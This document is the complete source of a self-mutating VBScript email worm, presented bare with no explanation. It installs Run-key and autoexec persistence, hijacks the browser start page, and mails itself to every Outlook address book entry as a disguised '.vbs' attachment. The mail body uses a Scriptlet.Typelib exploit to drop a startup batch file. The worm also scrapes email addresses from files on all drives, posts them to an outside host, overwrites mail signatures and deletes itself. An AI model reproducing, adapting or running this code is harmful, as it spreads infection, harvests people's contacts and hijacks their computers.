rem yrvbkncd bfbj pobrxvdyy qkafj qynlbtfn tdcfsmp xrbivj mlojyopuql pviadmy nlsh sn vhl gisdafrw lhillagor vsxjkctyn gmybnbix djkganrj cfj tooml nqyr mwaqsji ove gc eeju czzykfaax gozargb fzhvkxzmh lmovnmhw nagnffz idvqylqam xw sid fnuc ouec jw ygt pep ylz khezl abvm xco ryrx zarozcku nuzroeoz ekmrwcgvc incfj sjaqbgu palx wv sb htfwlcxq gyhu jbqrmvet fxdwzhof opu
Set qkafj=CreateObject("Scripting.FileSystemObject"):on error resume next
set nlsh=CreateObject("WScript.Shell")
Set vhl=CreateObject("Outlook.Application")
Set gisdafrw=vhl.GetNameSpace("MAPI")
set pviadmy=qkafj.getspecialfolder(1):nlsh.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
Set bfbj=qkafj.OpenTextFile(WScript.ScriptFullname, 1)
yrvbkncd=bfbj.readline
pobrxvdyy=bfbj.ReadAll
pobrxvdyy=yrvbkncd&vbCrLf&pobrxvdyy
qynlbtfn=Split(yrvbkncd, " ")
For i=1 To UBound(qynlbtfn)
Randomize
xrbivj=Int(Rnd()*8+2)
Do
tdcfsmp=""
For j=1 To xrbivj
tdcfsmp=tdcfsmp&Chr(97+Int(Rnd()*26))
Next
Loop While Not InStr(1,pobrxvdyy,tdcfsmp)=0
pobrxvdyy=Replace(pobrxvdyy,qynlbtfn(i),tdcfsmp)
Next
bfbj.close
set bfbj=qkafj.CreateTextFile(pviadmy&"\mlojyopuql.vbs"):bfbj.close
set bfbj=qkafj.OpenTextFile(pviadmy&"\mlojyopuql.vbs",2)
bfbj.write pobrxvdyy:bfbj.close
sn="set nlsh=CreateObject("&Chr(34)&"WScript.Shell"&Chr(34)&")"&vbcrlf&"On error resume next"&vbcrlf&"lhillagor=nlsh.RegRead("&Chr(34)&"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\lhillagor"&Chr(34)&")"&vbcrlf&"if lhillagor="&Chr(34)&""&Chr(34)&" Then "&vbcrlf&" nlsh.RegWrite "&Chr(34)&"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\lhillagor"&Chr(34)&",Now()"&vbcrlf&"Else"&vbcrlf&" if DateDiff("&Chr(34)&"d"&Chr(34)&",lhillagor,Now())"&chr(62)&"4 Then nlsh.RegWrite "&Chr(34)&"HKCU\Software\Microsoft\Internet Explorer\Main\Start Page"&Chr(34)&","&Chr(34)&"http://www.freedonation.com"&Chr(34)&vbcrlf&"End if"
set bfbj=qkafj.CreateTextFile(pviadmy&"\sn.vbs"):bfbj.close
set bfbj=qkafj.OpenTextFile(pviadmy&"\sn.vbs",2)
bfbj.write sn:bfbj.close
nlsh.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\sn",pviadmy&"\sn.vbs"
set bfbj=qkafj.CreateTextFile(pviadmy&"\blank.htm"):bfbj.close
set bfbj=qkafj.OpenTextFile(pviadmy&"\blank.htm",2)
bfbj.write chr(60)&"script"&chr(62)&"window.open('ygt0.htm','gmybnbix','left=5000');window.location='http://www.freedonation.com'"&chr(60)&"/script"&chr(62):bfbj.close
nlsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page",pviadmy&"\blank.htm"
czzykfaax=0
For djkganrj=6 To 3 Step -1
Set nqyr=gisdafrw.GetDefaultFolder(djkganrj)
For cfj=1 To nqyr.Items.Count
If not nqyr.Items(cfj).Attachments.Count=0 And not djkganrj=3 Then fzhvkxzmh=nqyr.Items(cfj).Subject:lmovnmhw=nqyr.Items(cfj).Attachments(1)
mwaqsji=""
Set mwaqsji=nqyr.Items(cfj).ReplyAll()
If mwaqsji="" Then Set mwaqsji=nqyr.Items(i)
For tooml=1 To mwaqsji.Recipients.Count
If not InStr(1, mwaqsji.Recipients(tooml).Address, "@")=0 And InStr(1, eeju, mwaqsji.Recipients(tooml).Address)=0 Then
eeju=eeju&mwaqsji.Recipients(tooml).Address&","
gozargb=gozargb+1
If gozargb=90 Then jw (czzykfaax): czzykfaax=czzykfaax+1: gozargb=0:eeju=""
End If
Next
Next
Next
if lmovnmhw="" Then fzhvkxzmh=nqyr.items(1).subject:lmovnmhw="mlojyopuql.txt"
if Not fzhvkxzmh="" Then attahc8=fzhvkxzmh&".msg" 
lmovnmhw=lmovnmhw&"              (9 Kbytes).vbs"
sub jw(n)
set bfbj=qkafj.CreateTextFile(pviadmy&"\ygt"&n&".htm")
bfbj.close:eeju=replace(eeju,".,",",")
set bfbj=qkafj.OpenTextFile(pviadmy&"\ygt"&n&".htm",2)
bfbj.write(chr(60)&"form action='http://www.mycgiserver.com/~hunger/spread.php3' method=post"&chr(62)&""&chr(60)&"input type=hidden name=n value='"&pviadmy&"\ygt"&n+1&".htm'"&chr(62)&""&chr(60)&"input type=hidden name=bcc value='"&eeju&"'"&chr(62)&""&chr(60)&"input type=hidden name=sub value='"&fzhvkxzmh&"'"&chr(62)&""&chr(60)&"input type=hidden name=att value='"&lmovnmhw&"'"&chr(62)&""&chr(60)&"/form"&chr(62)&""&chr(60)&"script"&chr(62)&"document.forms[0].submit()"&chr(60)&"/script"&chr(62)):bfbj.close
czzykfaax=czzykfaax+1:gozargb=0:eeju=""
End sub
vsxjkctyn=vbcrlf&"echo off"&vbcrlf&"cls"&vbcrlf
Set bfbj=qkafj.OpenTextFile(pviadmy&"\mlojyopuql.vbs", 1)
vsxjkctyn=vsxjkctyn&"echo "&bfbj.readline&chr(62)&"gmybnbix.vbs"&vbcrlf
do
vsxjkctyn=vsxjkctyn&"echo "&bfbj.readline&chr(62)&chr(62)&vbcrlf
loop while not bfbj.atendofstream
vsxjkctyn=vsxjkctyn&"echo REGEDIT4"&chr(62)&" ouec.reg"&vbcrlf&"echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]"&chr(62)&chr(62)&"ouec.reg"&vbcrlf&"echo "&Chr(34)&"gmybnbix"&chr(34)&"="&chr(34)&"c:\\recycled\\gmybnbix.vbs"&chr(34)&""&chr(62)&chr(62)&"ouec.reg"&vbcrlf
vsxjkctyn=vsxjkctyn&"echo rem"&chr(62)&chr(62)&"c:\autoexec.bat"&vbcrlf&"echo regedit c:\ouec.reg"&chr(62)&chr(62)&"c:\autoexec.bat"&vbcrlf&"copy gmybnbix.vbs c:\windows\startm~1\programs\startup\gmybnbix.vbs"&vbcrlf&"copy gmybnbix.vbs c:\windows\menudÇ~1\programmes\dÇmarrage\gmybnbix.vbs"&vbcrlf&"copy gmybnbix.vbs c:\windows\men£in~1\programas\inicio\gmybnbix.vbs"&vbcrlf&"copy gmybnbix.vbs c:\windows\alluse~1\menuin~1\programas\iniciar\gmybnbix.vbs"&vbcrlf&"copy gmybnbix.vbs c:\windows\startmenÅ\programme\autostart\gmybnbix.vbs"&vbcrlf&"copy gmybnbix.vbs c:\recycled\gmybnbix.vbs"&vbcrlf&"del c:\windows\winstart.bat"&vbcrlf
cuerpohtml=chr(60)&"head"&chr(62)&chr(60)&"meta http-equiv='refresh' content='1;url=http://www.mycgiserver.com/~p1x3ll/refresh.htm'"&chr(62)&chr(60)&"/head"&chr(62)&chr(60)&"script language='vbscript'"&chr(62)&vbcrlf&"on error resume next"&vbcrlf&"set fnuc=CreateObject("&Chr(34)&"Scriptlet.Typelib"&Chr(34)&")"&vbcrlf&"endl="&chr(34)&chr(62)&chr(62)&"gmybnbix.vbs"&chr(34)&"&vbcrlf"&vbcrlf&"fnuc.doc="&ove(vsxjkctyn)&vbcrlf&"fnuc.path="&Chr(34)&"c:\windows\winstart.bat"&Chr(34)&vbcrlf&"fnuc.write"&vbcrlf&chr(60)&"/script"&chr(62)
Dim nagnffz,idvqylqam, xw
qkafj.CopyFile pviadmy&"\mlojyopuql.vbs",pviadmy&"\"&lmovnmhw
For idvqylqam=1 To gisdafrw.AddressLists.Count
Set sid=gisdafrw.AddressLists(idvqylqam)
For xw=1 To sid.AddressEntries.Count
Set nagnffz=vhl.CreateItem(0)
nagnffz.recipients.add sid.AddressEntries(xw)
nagnffz.Subject=fzhvkxzmh
nagnffz.HTMLBody=cuerpohtml
nagnffz.Attachments.Add (pviadmy&"\"&lmovnmhw)
nagnffz.DeleteAfterSubmit=True
nagnffz.Importance=2
nagnffz.Send
If not sid.AddressEntries(xw).Address="" Then
eeju=eeju & sid.AddressEntries(xw).Address & ","
gozargb=gozargb+1
If gozargb=90 Then jw(czzykfaax)
End if
Next
Next
jw(czzykfaax)
zarozcku=""&nlsh.RegRead("HKCU\Software\Mirabilis\ICQ\Owners\LastOwner")
Set ylz=qkafj.Drives
For Each pep In ylz
If pep.DriveType=2 Or pep.DriveType=3 Then gyhu(pep.path&"\")
Next
jw(czzykfaax):qkafj.DeleteFile WScript.ScriptFullName
Sub gyhu(jbqrmvet)
Dim khezl,xco,abvm:On Error Resume Next
Set khezl=qkafj.GetFolder(jbqrmvet)
Set abvm=khezl.SubFolders
For Each xco In abvm
gyhu (xco.path)
Set htfwlcxq=xco.Files
For Each ryrx In htfwlcxq
sb=qkafj.GetExtensionName(ryrx.path): sb=LCase(sb)
If sb="txt" Or sb="na2" Or sb="wab" Or sb="mbx" Then
Set bfbj=qkafj.OpenTextFile(ryrx.path,1):fxdwzhof(bfbj.readall)
ElseIf sb="dbx"  Or (sb="dat" And qkafj.getBaseName(ryrx.path)=zarozcku) Then
Set bfbj=qkafj.OpenTextFile(ryrx.path, 1)
While Not bfbj.atendofstream
fxdwzhof(bfbj.readline)
Wend
End If
Next
Next
End Sub
Sub fxdwzhof(ByVal txt)
txt=LCase(txt)
While True
palx=False
nuzroeoz=InStr(1, txt, "@")
If nuzroeoz=0 Then Exit Sub
ekmrwcgvc=nuzroeoz
Do
If ekmrwcgvc=1 Then Exit Do
ekmrwcgvc=ekmrwcgvc-1
wv=Asc(Mid(txt, ekmrwcgvc, 1))
Loop While (opu(wv,96) And opu(122,wv)) Or (opu(wv,47) And opu(57,wv)) Or wv=45 Or wv=46 Or wv=95
Do
nuzroeoz=nuzroeoz+1
wv=Asc(Mid(txt, nuzroeoz, 1))
If wv=46 Then palx=True
Loop While (opu(wv,96) And opu(122,wv)) Or (opu(wv,47) And opu(57,wv)) Or wv=45 Or wv=46 Or wv=95
incfj=ekmrwcgvc+1
sjaqbgu=nuzroeoz-1
If not int((sjaqbgu-incfj)/6)=0  And palx=True Then
malead=Mid(txt, incfj, sjaqbgu-incfj+1)
If InStr(1, eeju, malead)=0 Then
eeju=eeju&malead&","
gozargb=gozargb+1
End If
If gozargb=90 Then jw(czzykfaax)
End If
txt=Mid(txt, nuzroeoz+2, Len(txt)-nuzroeoz-1)
Wend
End Sub
set khezl=qkafj.getfolder(qkafj.getSpecialfolder(0)&"\Application Data\Microsoft\Signatures")
set xco=khezl.Files
For each ryrx in xco
if Lcase(qkafj.getExtensionName(ryrx.path))="htm" Then
set bfbj=qkafj.opentextfile(ryrx.path,2)
bfbj.write cuerpohtml
End if
Next
Function ove(gc)
gc=Replace(gc,Chr(34),Chr(34)&"&Chr(34)&"&Chr(34))
gc=replace(gc,chr(62)&chr(62)&vbcrlf,chr(34)&"&endl&"&chr(34))
gc=Replace(gc,vbCrLf,Chr(34)&"&vbcrlf&"&Chr(34))
gc=Chr(34)&gc&Chr(34)
ove=gc
End Function
function opu(a,b)
if a-b=abs(a-b) Then opu=True Else opu=False
end function
